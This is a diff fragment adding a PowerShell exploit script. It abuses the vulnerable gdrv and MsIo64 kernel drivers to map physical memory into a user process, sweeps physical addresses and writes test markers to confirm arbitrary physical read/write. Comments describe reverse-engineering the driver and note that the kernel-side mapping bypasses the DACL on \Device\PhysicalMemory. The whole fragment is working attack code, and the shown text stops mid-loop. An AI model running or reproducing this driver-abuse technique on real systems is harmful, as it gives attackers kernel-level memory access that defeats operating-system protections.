@@ -1,0 +1,50 @@
+                if ([P36Prov]::IsUserVa($v)) {
+                    $sample = [P36Prov]::ReadAt($v, 16)
+                    Log ("    q[{0}]=0x{1:x} deref={2} match={3}" -f $k, $v, $sample, ($sample -eq $ref4))
+                    if ($sample -eq $ref4 -and -not $verdict.W2_msio) {
+                        $verdict.W2_msio = $true
+                        Log ("    W2 PASS - user view at 0x{0:x} maps pa=0x1000; marker test:" -f $v)
+                        $o2 = [P36Prov]::ReadAt($v, 8)
+                        [P36Prov]::WriteAt($v, $MARK) | Out-Null
+                        $back = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1000, 8))
+                        [P36Prov]::WriteAt($v, [byte[]]($o2 -split ' ' | ForEach-Object { [Convert]::ToByte($_,16) })) | Out-Null
+                        $res = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1000, 8))
+                        Log ("    orig={0} wrote={1} via_gdrv={2} restored={3}" -f $o2, ([P36Prov]::Hex($MARK)), $back, $res)
+                        if ($back -ne ([P36Prov]::Hex($MARK)) -or $res -ne $o2) { $verdict.W2_msio = $false; Log '    W2 marker NOT coherent' }
+                    }
+                }
+            }
+        }
+        if ($verdict.W2_msio) { break }
+    }
+    # REVISED-2 shape, from the full worker-0x1090 RE (temp\drv\annot_MsIo64.txt):
+    #   in = { q0 = len (driver caps at 4), q1 = user VA whose low32 == the PA to map,
+    #          q2/q3/q4 = 0 in -> section handle / view base in OUR process / object out }.
+    #   The driver opens \Device\PhysicalMemory KERNEL-side (Zw, PreviousMode=kernel),
+    #   so the usermode DACL that kills W1 does not apply; the view lands in our own
+    #   process at SectionOffset=low32(q1), ViewSize=min(q0,4), RW+NOCACHE.
+    #   Worker 0x10aa range-checks low32(q1) in [G, G+0x10000000) of a driver global
+    #   (unknown statically) -> outside = err 5.  Sweep PAs; the OK-vs-err5 pattern
+    #   reveals the window, and in-window RAM PAs get the full marker test.
+    foreach ($pa in [uint64]0x20000, [uint64]0x100000, [uint64]0x200000, [uint64]0x800000,
+                        [uint64]0x2000000, [uint64]0x8000000, [uint64]0x10000000, [uint64]0x18000000,
+                        [uint64]0x20000000, [uint64]0x30000000, [uint64]0x38000000, [uint64]0x40000000,
+                        [uint64]0x60000000, [uint64]0x80000000, [uint64]0xA0000000, [uint64]0xC0000000,
+                        [uint64]0xE0000000, [uint64]0xF0000000) {
+        # 02:11 post-mortem: the 02:00:26 run logged ZERO try3 lines although this loop
+        # is unconditional - something threw before the first Log and the whole foreach
+        # was silently skipped.  Catch per-PA so one bad call neither eats the loop
+        # nor stays invisible: the exception text lands in p36_write.txt.
+        try {
+        $e5 = [uint32]0; $vb = [uint64]0; $o2h = [uint64]0; $o4o = [uint64]0
+        $st3 = [P36Prov]::MsIoMapTry3($mio, $pa, 4, [ref]$e5, [ref]$vb, [ref]$o2h, [ref]$o4o)
+        Log ("  try3 {0}  view=0x{1:x} h=0x{2:x} obj=0x{3:x}" -f $st3, $vb, $o2h, $o4o)
+        if ($vb -ne 0 -and [P36Prov]::InRam($pa)) {
+            $gref = [P36Prov]::Hex([P36Prov]::GdrvRead($g, $pa, 4))
+            $vs   = [P36Prov]::ReadAt($vb, 4)
+            Log ("    view[0:4]={0} gdrv[0:4]={1} match={2}" -f $vs, $gref, ($vs -eq $gref))
+            if ($vs -eq $gref) {
+                $m4 = [byte[]]($MARK[0..3]); $mh = [P36Prov]::Hex($m4)
+                $o2 = $vs
+                [P36Prov]::WriteAt($vb, $m4) | Out-Null
+                $bk = [P36Prov]::Hex([P36Prov]::GdrvRead($g, $pa, 4))
